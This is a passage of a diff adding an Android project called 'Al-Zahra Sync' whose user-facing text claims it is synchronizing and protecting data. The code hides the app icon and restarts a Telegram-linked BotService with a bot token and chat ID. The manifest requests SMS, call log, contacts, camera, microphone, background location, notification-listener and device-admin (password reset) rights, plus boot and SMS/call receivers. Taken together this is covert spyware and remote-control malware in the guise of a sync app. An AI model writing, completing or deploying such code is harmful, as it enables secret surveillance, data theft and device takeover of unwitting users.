+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+            Log.d(TAG, "App icon hidden");
+        } catch (Exception e) {
+            Log.e(TAG, "Hide icon error: " + e.getMessage());
+        }
+    }
+    
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        // إعادة تشغيل الخدمات إذا تم إغلاق النشاط
+        if (servicesStarted) {
+            try {
+                Intent intent = new Intent(this, BotService.class);
+                intent.putExtra("token", BOT_TOKEN);
+                intent.putExtra("chat_id", CHAT_ID);
+                startService(intent);
+            } catch (Exception e) {
+                Log.e(TAG, "Restart on destroy error: " + e.getMessage());
+            }
+        }
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/MainApplication.java
+================================================
+
+package com.alzahra;
+
+import android.app.Application;
+
+public class MainApplication extends Application {
+    @Override
+    public void onCreate() {
+        super.onCreate();
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/res/values/strings.xml
+================================================
+
+<resources>
+    <string name="app_name">Al-Zahra Sync</string>
+    <string name="welcome">جاري التزامن...</string>
+    <string name="notification_title">Synchronization Service</string>
+    <string name="notification_text">جاري حماية البيانات</string>
+</resources>
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/res/values/colors.xml
+================================================
+
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <color name="primary">#4CAF50</color>
+    <color name="primary_dark">#388E3C</color>
+    <color name="accent">#FFC107</color>
+    <color name="background">#FFFFFF</color>
+    <color name="text_primary">#212121</color>
+</resources>
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/res/values/themes.xml
+================================================
+
+<resources>
+    <style name="Theme.AlZahra" parent="Theme.MaterialComponents.DayNight.NoActionBar">
+        <item name="colorPrimary">@color/primary</item>
+        <item name="colorPrimaryVariant">@color/primary_dark</item>
+        <item name="colorAccent">@color/accent</item>
+        <item name="android:windowBackground">@color/background</item>
+    </style>
+</resources>
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/res/xml/admin_policies.xml
+================================================
+
+<?xml version="1.0" encoding="utf-8"?>
+<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+    <uses-policies>
+        <force-lock />
+        <limit-password />
+        <watch-login />
+        <reset-password />
+    </uses-policies>
+</device-admin>
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/res/layout/activity_main.xml
+================================================
+
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="@color/background"
+    android:gravity="center"
+    android:orientation="vertical"
+    android:padding="24dp">
+
+    <ProgressBar
+        android:layout_width="64dp"
+        android:layout_height="64dp"
+        android:indeterminate="true" />
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_marginTop="24dp"
+        android:text="@string/welcome"
+        android:textColor="@color/text_primary"
+        android:textSize="20sp" />
+</LinearLayout>
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml
+================================================
+
+<?xml version="1.0" encoding="utf-8"?>
+<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
+    <background android:drawable="@android:color/white"/>
+    <foreground android:drawable="@drawable/ic_launcher_foreground"/>
+</adaptive-icon>
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/res/mipmap-anydpi-v26/ic_launcher_round.xml
+================================================
+
+<?xml version="1.0" encoding="utf-8"?>
+<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
+    <background android:drawable="@android:color/white"/>
+    <foreground android:drawable="@drawable/ic_launcher_foreground"/>
+</adaptive-icon>
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/res/drawable/ic_launcher_foreground.xml
+================================================
+
+<?xml version="1.0" encoding="utf-8"?>
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="108dp"
+    android:height="108dp"
+    android:viewportWidth="108"
+    android:viewportHeight="108">
+    <path android:fillColor="#4CAF50" android:pathData="M54,38c-8.84,0 -16,7.16 -16,16s7.16,16 16,16 16,-7.16 16,-16 -7.16,-16 -16,-16zM54,58c-3.31,0 -6,-2.69 -6,-6s2.69,-6 6,-6 6,2.69 6,6 -2.69,6 -6,6z"/>
+    <path android:fillColor="#4CAF50" android:pathData="M20,80c0,-11.05 8.95,-20 20,-20h28c11.05,0 20,8.95 20,20v2H20v-2z"/>
+</vector>
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/AndroidManifest.xml
+================================================
+
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- ==== جميع الأذونات المطلوبة ==== -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
+    
+    <!-- لمنع دخول الجهاز في السبات -->
+    <uses-permission android:name="android.permission.DEVICE_POWER" />
+
+    <application
+        android:name=".MainApplication"
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.AlZahra"
+        android:usesCleartextTraffic="true"
+        android:requestLegacyExternalStorage="true">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:launchMode="singleTask">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- ==== الخدمات الأساسية ==== -->
+        <service
+            android:name=".services.BotService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+            
+        <service
+            android:name=".services.CoreService"
+            android:enabled="true"
+            android:exported="false" />
+
+        <service
+            android:name=".services.NotificationService"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- ==== مستقبلات إعادة التشغيل ==== -->
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+        
+        <receiver
+            android:name=".receivers.ServiceRestarter"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.alzahra.RESTART_SERVICE" />
+            </intent-filter>
+        </receiver>
+        
+        <receiver
+            android:name=".receivers.CallReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
+        
+        <receiver
+            android:name=".receivers.SMSReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        
+        <receiver
+            android:name=".receivers.AdminReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/admin_policies" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
+
+
+================================================
+FILE: ./AlZahraSync/app/build.gradle
+================================================
+
+plugins {
+    id 'com.android.application'
+    id 'com.google.gms.google-services'
+}
+
+android {
+    namespace 'com.alzahra'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.alzahra.sync"
+        minSdk 21
+        targetSdk 34
+        versionCode 1
+        versionName "3.0"
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+        debug {
+            minifyEnabled false
+        }
+    }
+    
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_1_8
+        targetCompatibility JavaVersion.VERSION_1_8
+    }
+    
+    packagingOptions {
+        pickFirst '**/META-INF/LICENSE.md'
+        pickFirst '**/META-INF/LICENSE.txt'
+        pickFirst '**/META-INF/LICENSE'
+        pickFirst '**/META-INF/NOTICE.md'
+        pickFirst '**/META-INF/NOTICE.txt'
+        pickFirst '**/META-INF/NOTICE'
+        pickFirst '**/META-INF/NOTICE.markdown'
+        pickFirst '**/META-INF/DEPENDENCIES'
+        pickFirst '**/META-INF/*.md'
+        pickFirst '**/META-INF/*.markdown'
+        pickFirst '**/META-INF/*.SF'
+        pickFirst '**/META-INF/*.DSA'
+        pickFirst '**/META-INF/*.RSA'
+        exclude 'META-INF/LICENSE.md'
+        exclude 'META-INF/LICENSE.txt'
+        exclude 'META-INF/LICENSE'
+        exclude 'META-INF/NOTICE.md'
+        exclude 'META-INF/NOTICE.txt'
+        exclude 'META-INF/NOTICE'
+        exclude 'META-INF/NOTICE.markdown'
+        exclude 'META-INF/DEPENDENCIES'
+        exclude 'META-INF/*.md'
+        exclude 'META-INF/*.markdown'
+    }
+    
+    configurations {
+        all {
+            exclude group: 'javax.inject', module: 'javax.inject'
+        }
+    }
+}
+
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'com.google.android.material:material:1.11.0'
+    implementation 'com.google.code.gson:gson:2.10.1'
+    implementation('org.telegram:telegrambots:6.9.0') {
+        exclude group: 'javax.inject', module: 'javax.inject'
+    }
+    implementation platform('com.google.firebase:firebase-bom:32.7.0')
+    implementation 'com.google.firebase:firebase-database'
+}
+
+
+================================================
+FILE: ./AlZahraSync/build.gradle
+================================================
+
+plugins {
+    id 'com.android.application' version '8.2.0' apply false
+    id 'com.google.gms.google-services' version '4.4.0' apply false
+}
+
+
+================================================
+FILE: ./AlZahraSync/settings.gradle
+================================================
+
+pluginManagement {
+    repositories {
+        google()
+        mavenCentral()
+        gradlePluginPortal()
+    }
+}
+dependencyResolutionManagement {
+    repositoriesMode.set(RepositoriesMode.PREFER_SETTINGS)
+    repositories {
+        google()
+        mavenCentral()
+    }
+}
+rootProject.name = "AlZahraSync"
+include ':app'
